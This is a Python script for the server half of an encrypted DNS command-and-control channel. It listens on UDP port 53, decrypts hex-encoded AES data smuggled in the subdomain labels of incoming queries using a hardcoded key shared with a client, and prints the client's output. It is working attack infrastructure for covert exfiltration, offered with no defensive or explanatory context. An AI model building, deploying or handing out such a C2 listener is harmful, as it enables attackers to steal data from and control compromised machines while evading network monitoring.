from dnslib import DNSRecord, RR, QTYPE, A
from Crypto.Cipher import AES
import base64
import socketserver

AES_KEY = b'\x7f\x96\x91\xbf\xdd:\xab\xafU\xa0\xbe\x14\x1en\x9a\x8c'  # same key as client
DOMAIN = "google.com"  # your domain (adjust if needed)

def unpad(s):
    return s[:-ord(s[-1])]

def decrypt(hex_data):
    cipher = AES.new(AES_KEY, AES.MODE_ECB)
    raw = base64.b16decode(hex_data)
    return unpad(cipher.decrypt(raw).decode())

def is_hex(s):
    try:
        int(s, 16)
        return True
    except ValueError:
        return False

class DNSHandler(socketserver.DatagramRequestHandler):
    def handle(self):
        data = self.rfile.read()
        dns_request = DNSRecord.parse(data)
        qname = str(dns_request.q.qname).rstrip('.')
        
        print(f"[+] DNS Query: {qname}")
        
        labels = qname.split('.')
        # Remove domain labels from the end to isolate encrypted chunks
        domain_parts = DOMAIN.split('.')
        encrypted_labels = labels[:-len(domain_parts)]

        encrypted_hex = "".join(encrypted_labels).upper()  # uppercase for base16

        if encrypted_hex and is_hex(encrypted_hex):
            try:
                plaintext = decrypt(encrypted_hex)
                print(f"[🔐] Client output: {plaintext}")
            except Exception as e:
                print("[!] Error decrypting client data:", e)
        else:
            print(f"[+] Non-encrypted DNS query received or no data: {qname}")

        # Respond with dummy A record (127.0.0.1)
        dns_reply = dns_request.reply()
        dns_reply.add_answer(RR(rname=dns_request.q.qname, rtype=QTYPE.A, rdata=A("127.0.0.1"), ttl=60))
        self.wfile.write(dns_reply.pack())

if __name__ == "__main__":
    print("[*] Starting Encrypted DNS C2 Server on UDP/53...")
    server = socketserver.UDPServer(("0.0.0.0", 53), DNSHandler)
    server.serve_forever()
